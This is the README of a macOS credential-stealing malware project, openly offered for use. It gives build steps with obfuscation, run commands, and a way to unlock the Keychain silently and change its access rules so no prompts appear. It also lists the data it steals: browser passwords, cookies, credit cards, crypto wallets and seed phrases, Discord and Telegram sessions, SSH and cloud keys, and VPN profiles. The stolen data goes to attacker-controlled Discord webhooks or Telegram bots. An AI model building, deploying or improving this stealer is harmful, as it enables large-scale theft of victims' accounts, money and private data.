# Kematian-Mac

**Standalone macOS-only project** — not part of Overlord / StuartPirate.

Harvest binary built from **Kematian-main** recovery source (`recovery/` is macOS code only — no Windows/Linux paths). Runs once on a Mac, collects browser credentials and related data, zips the results, and posts to a **Discord webhook**.

Overlord uses the separate **Kematian Overlord plugin** on Windows/Linux. This repo is only the independent Mac executable.

## Build on GitHub Actions (recommended)

1. Repo **Settings → Secrets and variables → Actions** → add secrets (at least one upload method):
   - `DISCORD_WEBHOOK` = `https://discord.com/api/webhooks/ID/TOKEN` (optional)
   - `TELEGRAM_BOT_TOKEN` = token from [@BotFather](https://t.me/BotFather) (optional)
   - `TELEGRAM_CHAT_ID` = your user ID, group ID, or channel ID (optional)
2. **Actions → macOS Build (CGO) → Run workflow**
   - Paste **telegram_bot_token** and **telegram_chat_id** (or rely on secrets)
   - **discord_webhook** is optional if Telegram is configured
   - **Obfuscate with garble** — on by default
3. Download artifact **stuart-mac-stealer-macos**

Credentials are **baked into the binary** at build time. Override at runtime with flags/env if needed.

Pushes to `main` and version tags `v*` also run this workflow (garble + `-literals` enabled, uses `DISCORD_WEBHOOK` secret).

## Build locally (on a Mac)

```bash
chmod +x scripts/build-macos.sh
DISCORD_WEBHOOK="https://discord.com/api/webhooks/ID/TOKEN" ./scripts/build-macos.sh

# With garble (like Overlord agent):
go install mvdan.cc/garble@latest
OBFUSCATE=true GARBLE_FLAGS="-literals" DISCORD_WEBHOOK="https://discord.com/api/webhooks/ID/TOKEN" ./scripts/build-macos.sh
```

Outputs:

- `dist/kematian-darwin-arm64`
- `dist/kematian-darwin-amd64`

Requires **CGO** (`CGO_ENABLED=1`, default on macOS).

## Run

```bash
chmod +x dist/kematian-darwin-arm64
DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/ID/TOKEN" ./dist/kematian-darwin-arm64
```

Or:

```bash
./dist/kematian-darwin-arm64 -webhook "https://discord.com/api/webhooks/ID/TOKEN"
```

`-quiet` reduces console output.

### macOS login password (silent Keychain unlock)

Chrome/Brave/Edge saved passwords need the **login Keychain** unlocked. Without your Mac password, `security` may fail (`exit status 128`) or show a GUI prompt.

```bash
./kematian-darwin-arm64 -mac-password 'YourMacLoginPassword'
# or
KEMATIAN_MAC_PASSWORD='YourMacLoginPassword' ./kematian-darwin-arm64
```

This runs `security unlock-keychain` before harvest, passes `-p` on every `security(1)` call (Chrome Safe Storage, Wi‑Fi, keychain dump, Discord), and updates keychain ACLs so **no extra Keychain Access dialogs** should appear during harvest. Use the **real Mac login password** (the account password, not the webhook). The Mac login password is also added to `password_candidates.json` for wallet cracking.

**Note:** `-mac-password` silences **Keychain** prompts. macOS **Privacy (TCC)** dialogs — e.g. Full Disk Access for protected folders — cannot be granted with a password; grant **Full Disk Access** to Terminal on a test Mac if needed.

### Discord upload size

Webhook uploads are split into **≤8MB** zip parts. Discord returns `HTTP 413 Request entity too large` if a single POST exceeds their limit (~8–25MB depending on payload). Multi-part uploads look like `hostname-kematian-arm64-part1.zip`, `part2.zip`, etc.

## What it collects

- Passwords, cookies, history, bookmarks, autofill, credit cards  
- Browser extensions (**229 named wallet IDs only** — [targeted_extensions.csv](https://gist.github.com/jiayuchann/ba3cd9f4f430a9351fdff75869959853) gist + curated sources; unknown IDs dropped)
- Desktop wallets (Exodus, Ledger Live, Electrum, Sparrow, Wasabi, Daedalus, and more)
- Desktop + browser wallet data, Discord tokens, SSH/cloud keys  
- Sensitive files and seed phrase scan  
- **Telegram** sessions (`tdata`)
- **App credentials:** Wi‑Fi passwords, FileZilla saved servers
- **Gaming:** Steam, Battle.net, Epic, Riot, Ubisoft
- **VPN:** NordVPN, WireGuard, OpenVPN, Mullvad, Tunnelblick profiles
- **Password candidates:** browser + keychain + mutations + app/VPN passwords (`password_candidates.json`)

## Upload destinations

Configure **Discord**, **Telegram**, or **both** at build time.

### Telegram Bot (recommended for large loot)

- Up to **~45MB per zip** (vs ~8MB practical Discord limit)
- Sends harvest zips, scanned files, and **victim Telegram `tdata`** archives
- Get chat ID: message [@userinfobot](https://t.me/userinfobot) or add bot to a channel and use channel ID (often `-100…`)

```bash
# Build-time via GitHub Actions inputs or secrets TELEGRAM_BOT_TOKEN + TELEGRAM_CHAT_ID
./kematian-darwin-arm64

# Runtime override
./kematian-darwin-arm64 -telegram-token 'BOT:TOKEN' -telegram-chat '-1001234567890'
```

### Discord webhook (optional)

- Summary embed + zip parts (8MB chunks when Discord is enabled)
- Use together with Telegram to get mobile Discord notifications + large Telegram files

```bash
./kematian-darwin-arm64 -webhook 'https://discord.com/api/webhooks/...'
```

### Upload phases

1. **Primary harvest** — logs, passwords, wallets, `password_candidates.json`
2. **Scanned files** — PDF, TXT, images
3. **Victim Telegram tdata** — `*-telegram-Main.zip` per session (if Telegram Desktop installed)

## Source

`recovery/` is from `Kematian-main/native/recovery`. Plugin/UI files from Kematian-main are not used here.